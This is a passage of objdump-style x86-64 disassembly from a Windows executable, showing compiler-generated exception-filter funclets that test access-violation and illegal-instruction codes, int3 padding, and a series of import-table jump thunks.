   14000d14d:	48 8b ea             	mov    %rdx,%rbp
   14000d150:	48 8b 45 58          	mov    0x58(%rbp),%rax
   14000d154:	8b 08                	mov    (%rax),%ecx
   14000d156:	48 83 c4 20          	add    $0x20,%rsp
   14000d15a:	5d                   	pop    %rbp
   14000d15b:	e9 9c 72 ff ff       	jmp    0x1400043fc
   14000d160:	cc                   	int3
   14000d161:	cc                   	int3
   14000d162:	cc                   	int3
   14000d163:	cc                   	int3
   14000d164:	cc                   	int3
   14000d165:	cc                   	int3
   14000d166:	cc                   	int3
   14000d167:	cc                   	int3
   14000d168:	cc                   	int3
   14000d169:	cc                   	int3
   14000d16a:	cc                   	int3
   14000d16b:	cc                   	int3
   14000d16c:	cc                   	int3
   14000d16d:	cc                   	int3
   14000d16e:	cc                   	int3
   14000d16f:	cc                   	int3
   14000d170:	40 55                	rex push %rbp
   14000d172:	48 83 ec 20          	sub    $0x20,%rsp
   14000d176:	48 8b ea             	mov    %rdx,%rbp
   14000d179:	48 8b 01             	mov    (%rcx),%rax
   14000d17c:	33 c9                	xor    %ecx,%ecx
   14000d17e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000d184:	0f 94 c1             	sete   %cl
   14000d187:	8b c1                	mov    %ecx,%eax
   14000d189:	48 83 c4 20          	add    $0x20,%rsp
   14000d18d:	5d                   	pop    %rbp
   14000d18e:	c3                   	ret
   14000d18f:	cc                   	int3
   14000d190:	40 55                	rex push %rbp
   14000d192:	48 83 ec 20          	sub    $0x20,%rsp
   14000d196:	48 8b ea             	mov    %rdx,%rbp
   14000d199:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000d19e:	48 83 c4 20          	add    $0x20,%rsp
   14000d1a2:	5d                   	pop    %rbp
   14000d1a3:	e9 54 72 ff ff       	jmp    0x1400043fc
   14000d1a8:	cc                   	int3
   14000d1a9:	40 55                	rex push %rbp
   14000d1ab:	48 83 ec 20          	sub    $0x20,%rsp
   14000d1af:	48 8b ea             	mov    %rdx,%rbp
   14000d1b2:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000d1b7:	48 83 c4 20          	add    $0x20,%rsp
   14000d1bb:	5d                   	pop    %rbp
   14000d1bc:	e9 3b 72 ff ff       	jmp    0x1400043fc
   14000d1c1:	cc                   	int3
   14000d1c2:	40 55                	rex push %rbp
   14000d1c4:	48 83 ec 20          	sub    $0x20,%rsp
   14000d1c8:	48 8b ea             	mov    %rdx,%rbp
   14000d1cb:	33 c9                	xor    %ecx,%ecx
   14000d1cd:	48 83 c4 20          	add    $0x20,%rsp
   14000d1d1:	5d                   	pop    %rbp
   14000d1d2:	e9 25 72 ff ff       	jmp    0x1400043fc
   14000d1d7:	cc                   	int3
   14000d1d8:	40 55                	rex push %rbp
   14000d1da:	48 83 ec 20          	sub    $0x20,%rsp
   14000d1de:	48 8b ea             	mov    %rdx,%rbp
   14000d1e1:	80 7d 70 00          	cmpb   $0x0,0x70(%rbp)
   14000d1e5:	74 0b                	je     0x14000d1f2
   14000d1e7:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000d1ec:	e8 0b 72 ff ff       	call   0x1400043fc
   14000d1f1:	90                   	nop
   14000d1f2:	48 83 c4 20          	add    $0x20,%rsp
   14000d1f6:	5d                   	pop    %rbp
   14000d1f7:	c3                   	ret
   14000d1f8:	cc                   	int3
   14000d1f9:	40 55                	rex push %rbp
   14000d1fb:	48 83 ec 20          	sub    $0x20,%rsp
   14000d1ff:	48 8b ea             	mov    %rdx,%rbp
   14000d202:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000d206:	48 8b 09             	mov    (%rcx),%rcx
   14000d209:	48 83 c4 20          	add    $0x20,%rsp
   14000d20d:	5d                   	pop    %rbp
   14000d20e:	e9 61 8f ff ff       	jmp    0x140006174
   14000d213:	cc                   	int3
   14000d214:	40 55                	rex push %rbp
   14000d216:	48 83 ec 20          	sub    $0x20,%rsp
   14000d21a:	48 8b ea             	mov    %rdx,%rbp
   14000d21d:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   14000d224:	8b 08                	mov    (%rax),%ecx
   14000d226:	48 83 c4 20          	add    $0x20,%rsp
   14000d22a:	5d                   	pop    %rbp
   14000d22b:	e9 cc 71 ff ff       	jmp    0x1400043fc
   14000d230:	cc                   	int3
   14000d231:	40 55                	rex push %rbp
   14000d233:	48 83 ec 20          	sub    $0x20,%rsp
   14000d237:	48 8b ea             	mov    %rdx,%rbp
   14000d23a:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000d23f:	48 83 c4 20          	add    $0x20,%rsp
   14000d243:	5d                   	pop    %rbp
   14000d244:	e9 b3 71 ff ff       	jmp    0x1400043fc
   14000d249:	cc                   	int3
   14000d24a:	40 55                	rex push %rbp
   14000d24c:	48 83 ec 20          	sub    $0x20,%rsp
   14000d250:	48 8b ea             	mov    %rdx,%rbp
   14000d253:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000d257:	8b 08                	mov    (%rax),%ecx
   14000d259:	48 83 c4 20          	add    $0x20,%rsp
   14000d25d:	5d                   	pop    %rbp
   14000d25e:	e9 e1 b2 ff ff       	jmp    0x140008544
   14000d263:	cc                   	int3
   14000d264:	40 55                	rex push %rbp
   14000d266:	48 83 ec 20          	sub    $0x20,%rsp
   14000d26a:	48 8b ea             	mov    %rdx,%rbp
   14000d26d:	8b 4d 50             	mov    0x50(%rbp),%ecx
   14000d270:	48 83 c4 20          	add    $0x20,%rsp
   14000d274:	5d                   	pop    %rbp
   14000d275:	e9 ca b2 ff ff       	jmp    0x140008544
   14000d27a:	cc                   	int3
   14000d27b:	40 55                	rex push %rbp
   14000d27d:	48 83 ec 20          	sub    $0x20,%rsp
   14000d281:	48 8b ea             	mov    %rdx,%rbp
   14000d284:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000d289:	48 83 c4 20          	add    $0x20,%rsp
   14000d28d:	5d                   	pop    %rbp
   14000d28e:	e9 69 71 ff ff       	jmp    0x1400043fc
   14000d293:	cc                   	int3
   14000d294:	40 55                	rex push %rbp
   14000d296:	48 83 ec 20          	sub    $0x20,%rsp
   14000d29a:	48 8b ea             	mov    %rdx,%rbp
   14000d29d:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   14000d2a1:	48 83 c4 20          	add    $0x20,%rsp
   14000d2a5:	5d                   	pop    %rbp
   14000d2a6:	e9 c9 8e ff ff       	jmp    0x140006174
   14000d2ab:	cc                   	int3
   14000d2ac:	40 55                	rex push %rbp
   14000d2ae:	48 83 ec 20          	sub    $0x20,%rsp
   14000d2b2:	48 8b ea             	mov    %rdx,%rbp
   14000d2b5:	48 8b 01             	mov    (%rcx),%rax
   14000d2b8:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000d2be:	74 0c                	je     0x14000d2cc
   14000d2c0:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%rax)
   14000d2c6:	74 04                	je     0x14000d2cc
   14000d2c8:	33 c0                	xor    %eax,%eax
   14000d2ca:	eb 05                	jmp    0x14000d2d1
   14000d2cc:	b8 01 00 00 00       	mov    $0x1,%eax
   14000d2d1:	48 83 c4 20          	add    $0x20,%rsp
   14000d2d5:	5d                   	pop    %rbp
   14000d2d6:	c3                   	ret
   14000d2d7:	cc                   	int3
   14000d2d8:	cc                   	int3
   14000d2d9:	cc                   	int3
   14000d2da:	cc                   	int3
   14000d2db:	cc                   	int3
   14000d2dc:	cc                   	int3
   14000d2dd:	cc                   	int3
   14000d2de:	cc                   	int3
   14000d2df:	cc                   	int3
   14000d2e0:	ff 25 92 86 00 00    	jmp    *0x8692(%rip)        # 0x140015978
   14000d2e6:	cc                   	int3
   14000d2e7:	cc                   	int3
   14000d2e8:	cc                   	int3
   14000d2e9:	cc                   	int3
   14000d2ea:	cc                   	int3
   14000d2eb:	cc                   	int3
   14000d2ec:	cc                   	int3
   14000d2ed:	cc                   	int3
   14000d2ee:	cc                   	int3
   14000d2ef:	cc                   	int3
   14000d2f0:	ff 25 8a 86 00 00    	jmp    *0x868a(%rip)        # 0x140015980
   14000d2f6:	cc                   	int3
   14000d2f7:	cc                   	int3
   14000d2f8:	cc                   	int3
   14000d2f9:	cc                   	int3
   14000d2fa:	cc                   	int3
   14000d2fb:	cc                   	int3
   14000d2fc:	cc                   	int3
   14000d2fd:	cc                   	int3
   14000d2fe:	cc                   	int3
   14000d2ff:	cc                   	int3
   14000d300:	ff 25 82 86 00 00    	jmp    *0x8682(%rip)        # 0x140015988
   14000d306:	cc                   	int3
   14000d307:	cc                   	int3
   14000d308:	cc                   	int3
   14000d309:	cc                   	int3
   14000d30a:	cc                   	int3
   14000d30b:	cc                   	int3
   14000d30c:	cc                   	int3
   14000d30d:	cc                   	int3
   14000d30e:	cc                   	int3
   14000d30f:	cc                   	int3
   14000d310:	ff 25 7a 86 00 00    	jmp    *0x867a(%rip)        # 0x140015990
   14000d316:	cc                   	int3
   14000d317:	cc                   	int3
   14000d318:	cc                   	int3
   14000d319:	cc                   	int3
   14000d31a:	cc                   	int3
   14000d31b:	cc                   	int3
   14000d31c:	cc                   	int3
   14000d31d:	cc                   	int3
   14000d31e:	cc                   	int3
   14000d31f:	cc                   	int3
   14000d320:	ff 25 72 86 00 00    	jmp    *0x8672(%rip)        # 0x140015998
   14000d326:	cc                   	int3
   14000d327:	cc                   	int3
   14000d328:	cc                   	int3
   14000d329:	cc                   	int3
   14000d32a:	cc                   	int3
   14000d32b:	cc                   	int3
   14000d32c:	cc                   	int3
   14000d32d:	cc                   	int3
   14000d32e:	cc                   	int3
   14000d32f:	cc                   	int3
   14000d330:	ff 25 6a 86 00 00    	jmp    *0x866a(%rip)        # 0x1400159a0
   14000d336:	cc                   	int3
   14000d337:	cc                   	int3
   14000d338:	cc                   	int3
   14000d339:	cc                   	int3
   14000d33a:	cc                   	int3
   14000d33b:	cc                   	int3
   14000d33c:	cc                   	int3
   14000d33d:	cc                   	int3
   14000d33e:	cc                   	int3
   14000d33f:	cc                   	int3
   14000d340:	ff 25 62 86 00 00    	jmp    *0x8662(%rip)        # 0x1400159a8
   14000d346:	cc                   	int3
   14000d347:	cc                   	int3
   14000d348:	cc                   	int3
   14000d349:	cc                   	int3
   14000d34a:	cc                   	int3
   14000d34b:	cc                   	int3
   14000d34c:	cc                   	int3
   14000d34d:	cc                   	int3
   14000d34e:	cc                   	int3
   14000d34f:	cc                   	int3
   14000d350:	ff 25 5a 86 00 00    	jmp    *0x865a(%rip)        # 0x1400159b0
